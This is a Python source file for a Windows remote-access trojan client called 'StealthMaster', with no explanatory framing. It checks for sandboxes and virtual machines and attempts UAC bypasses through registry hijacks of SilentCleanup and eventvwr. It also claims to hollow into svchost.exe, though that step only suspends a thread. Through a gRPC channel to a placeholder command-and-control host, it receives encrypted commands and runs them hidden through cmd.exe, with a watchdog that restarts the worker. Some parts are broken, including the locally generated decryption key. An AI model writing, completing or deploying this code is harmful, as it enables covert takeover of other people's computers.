import os
import sys
import threading
import time
import ctypes
import base64
import random
import grpc
import win32api
import win32con
import win32process
from cryptography.fernet import Fernet
from queue import Queue
import command_pb2
import command_pb2_grpc

key = Fernet.generate_key()
cipher = Fernet(key)
C2_SERVER = "your-c2-server.com:443"  # Replace with your server address
CLIENT_ID = "client_001"


class StealthMaster:
    def __init__(self):
        self.running = True
        self.command_queue = Queue()
        self.check_interval = random.randint(60, 120)

    def hollow_process(self):
        try:
            target_pid = None
            for pid in win32process.EnumProcesses():
                handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
                exe = win32process.GetModuleFileNameEx(handle, 0)
                if "svchost.exe" in exe:
                    target_pid = pid
                    break
            if target_pid:
                ctypes.windll.kernel32.SuspendThread(handle)
                print(f"Hollowed into svchost.exe PID: {target_pid}")
        except Exception as e:
            print(f"Hollowing failed: {e}")

    def bypass_uac_silent(self):
        try:
            cmd = f'reg add HKCU\\Software\\Classes\\.pwn\\Shell\\Open\\command /ve /d "{sys.executable} \\"{__file__}\\"" /f'
            ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {cmd}", None, 0)
            time.sleep(1)
            os.system("schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I")
            print("UAC bypassed with SilentCleanup")
            sys.exit(0)
        except Exception:
            self.bypass_uac_fallback()

    def bypass_uac_fallback(self):
        try:
            cmd = f'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "{sys.executable} \\"{__file__}\\"" /f'
            ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {cmd}", None, 0)
            ctypes.windll.shell32.ShellExecuteW(None, "runas", "eventvwr.exe", None, None, 0)
            print("UAC bypassed with EventVwr")
            sys.exit(0)
        except Exception as e:
            print(f"UAC bypass failed: {e}")

    def detect_sandbox(self):
        checks = [
            lambda: os.path.exists("C:\\windows\\system32\\drivers\\vmmouse.sys"),
            lambda: ctypes.windll.kernel32.GetTickCount() < 10000,
        ]
        return any(check() for check in checks)

    def secure_communication(self):
        try:
            with grpc.secure_channel(C2_SERVER, grpc.ssl_channel_credentials()) as channel:
                stub = command_pb2_grpc.CommandServiceStub(channel)

                def request_stream():
                    while self.running:
                        yield command_pb2.CommandRequest(
                            client_id=CLIENT_ID,
                            report=f"Status from {CLIENT_ID} at {time.time()}"
                        )
                        time.sleep(5)

                responses = stub.CommandStream(request_stream())
                for response in responses:
                    encrypted_cmd = base64.b64decode(response.encrypted_data)
                    decrypted_cmd = cipher.decrypt(encrypted_cmd).decode()
                    self.command_queue.put(decrypted_cmd)
                    print(f"Received: {decrypted_cmd}")
        except Exception as e:
            print(f"gRPC stream failed: {e}")
            self.command_queue.put("default_cmd")

    def execute_command(self, command):
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "open", "cmd.exe", f"/c {command}", None, 0)
            print(f"Executed: {command[:50]}")
        except Exception as e:
            print(f"Execution failed: {e}")

    def worker(self):
        while self.running:
            try:
                self.secure_communication()
                while not self.command_queue.empty():
                    cmd = self.command_queue.get()
                    self.execute_command(cmd)
                time.sleep(self.check_interval)
            except Exception as e:
                print(f"Worker error: {e}")
                time.sleep(10)

    def watchdog(self):
        worker_thread = threading.Thread(target=self.worker, daemon=True)
        worker_thread.start()
        while self.running:
            if not worker_thread.is_alive():
                print("Worker crashed, restarting...")
                worker_thread = threading.Thread(target=self.worker, daemon=True)
                worker_thread.start()
            time.sleep(30)

    def run(self):
        if self.detect_sandbox():
            print("Sandbox detected, exiting...")
            sys.exit(0)

        if not ctypes.windll.shell32.IsUserAnAdmin():
            self.bypass_uac_silent()

        self.hollow_process()

        watchdog_thread = threading.Thread(target=self.watchdog, daemon=True)
        watchdog_thread.start()

        while self.running:
            time.sleep(120)


if __name__ == "__main__":
    master = StealthMaster()
    master.run()